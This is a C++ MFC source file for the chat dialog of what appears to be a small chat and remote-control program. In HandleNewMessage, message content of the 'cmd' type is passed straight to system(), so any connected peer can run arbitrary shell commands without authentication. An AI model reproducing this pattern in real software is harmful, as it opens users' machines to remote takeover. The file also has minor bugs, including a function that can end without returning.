// ChatDialog.cpp : 实现文件
//

#include "stdafx.h"

#include "RemoteControl.h"
#include "afxdialogex.h"
#include "ChatDialog.h"


// ChatDialog 对话框

IMPLEMENT_DYNAMIC(ChatDialog, CDialogEx)


ChatDialog::ChatDialog(CWnd* pParent, Session* isession):session( isession)
,CDialogEx(ChatDialog::IDD, pParent)
{

}



ChatDialog::~ChatDialog()
{

}


BOOL ChatDialog::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	DataManager* manager = DataManager::getInstance();
	session->setDialog(this);
	session->connect();
	vector < message >::iterator ite;
	vector < message > list= session->messageList;

	long l = session->m_user.IP;
	struct in_addr addr;
	addr.s_addr = l;
	char *s = inet_ntoa(addr);

	//userInfo.InsertString(-1, CString(session->m_user.ID));
	userInfo.InsertString(-1,CString(s));
	

	for (ite = list.begin(); ite != list.end(); ite++){

		message msg = *ite;
		CString timeStr = msg.time.Format("%y-%m-%d %H:%M:%S");
	allContent.InsertString(-1, timeStr);
	allContent.InsertString(-1, CString(msg.content.c_str()));
	allContent.InsertString(-1, L"");
	}
	allContent.InsertString(-1, L"--------以上是历史纪录-------");
	allContent.InsertString(-1, L"");
	return true;
}

void ChatDialog::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);

	DDX_Control(pDX, IDC_EDIT1, m_inptut);
	DDX_Control(pDX, IDC_LIST1, allContent);
	DDX_Control(pDX, IDC_LIST3, userInfo);
}

LRESULT ChatDialog::close(WPARAM wParam, LPARAM lParam){

	this->session->setDialog(nullptr);
	OnClose();
	return 0;
}




void ChatDialog::sendMsg(Message* msg){
	msg->ToID = session->m_user.ID;
	bool sendResult=session->sendMessage(msg);
	printf(sendResult==true? "":"");


}

BEGIN_MESSAGE_MAP(ChatDialog, CDialogEx)
	ON_MESSAGE(WM_MY_MESSAGE, &ChatDialog::HandleNewMessage)
	ON_MESSAGE(WM_CLOSE, &ChatDialog::close)
	ON_BN_CLICKED(IDC_BUTTON3, &ChatDialog::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON6, &ChatDialog::OnBnClickedButton6)
END_MESSAGE_MAP()


// ChatDialog 消息处理程序
LRESULT ChatDialog::HandleNewMessage(WPARAM wParam, LPARAM lParam){
	Message* msg = (Message*)lParam;
	int msg_type = msg->msg_type;
	string msg_content = msg->content;
	switch (msg_type)
	{

	case msg_type_text:{

					

						   CString timeStr = msg->time.Format("%y-%m-%d %H:%M:%S");
						   allContent.InsertString(-1, timeStr);
						   char from[20];
						   sprintf_s(from, " 【%u : 】", msg->FromID);

						   string fromStr = from + msg->content;

						   allContent.InsertString(-1, CString(fromStr.c_str()));

						   allContent.InsertString(-1, L"");

	}
		break;
	case msg_type_cmd:{

						  system(msg_content.c_str());
						  break;
	}

	case msg_type_image:
		break;
	case msg_type_file:
	{
						  string msg_content = msg->content;
						  //解析content，content包括文件大小，文件ID,文件密码；文件传输的端口号

						  //建立客户端socket

	}
		break;
	case msg_type_game:
		break;
	case msg_type_error:{
							LPARAM lp = (LPARAM)&msg;
						//	AfxGetApp()->m_pMainWnd->SendMessage(WM_MY_MESSAGE, 0, lp);
	}

		break;
	case msg_type_others:
		break;
	default:
		break;
		return 0;
	}
}


void ChatDialog::OnBnClickedButton3()
{
	CString str;

	m_inptut.GetWindowText(str);
	char buf[256];

	sprintf_s(buf, "%S", str);

	std::string strin = (CStringA)str;

	Message msg;

	msg.FromID = session->m_my_ID;
	msg.ToID = session->m_user.ID;
	CTime time = CTime::GetCurrentTime();
	msg.time = CTime::GetCurrentTime();
	msg.msg_type = msg_type_text;


	msg.content = strin;

	sendMsg(&msg);
	session->messageList.push_back(msg);
	AfxGetApp()->m_pMainWnd->SendMessage(WM_LISTCHANGE_MESSAGE, 0, NULL);

	CString timeStr = msg.time.Format("%y-%m-%d %H:%M:%S");
	allContent.InsertString(-1, timeStr);
	
	string fromStr = "【我】：" + msg.content;

	allContent.InsertString(-1, CString(fromStr.c_str()));
	allContent.InsertString(-1, L"");

	m_inptut.SetWindowText(L"");
	
	// TODO:  在此添加控件通知处理程序代码
}


//void insertNewMsg(){
//
//}

BOOL ChatDialog::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class 
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)//捕捉回车 
	{
		OnBnClickedButton3();
		//OnBnClickedButtonShow();//你可以调用一个按钮处理函数，把敲击回车的操作相当于点击那个按钮，如果只是想不响应回车，此句不用写，直接返回true 
		return TRUE;//直接返回true 
	}
	else
	{
		return CDialogEx::PreTranslateMessage(pMsg);
	}
}

void ChatDialog::OnBnClickedButton6()
{
	RemoteControl * remoteControl = new RemoteControl(this);
	remoteControl->Create(IDD_REMOTECONTROL, this);
	remoteControl->ShowWindow(SW_SHOW);
	// TODO:  在此添加控件通知处理程序代码
}
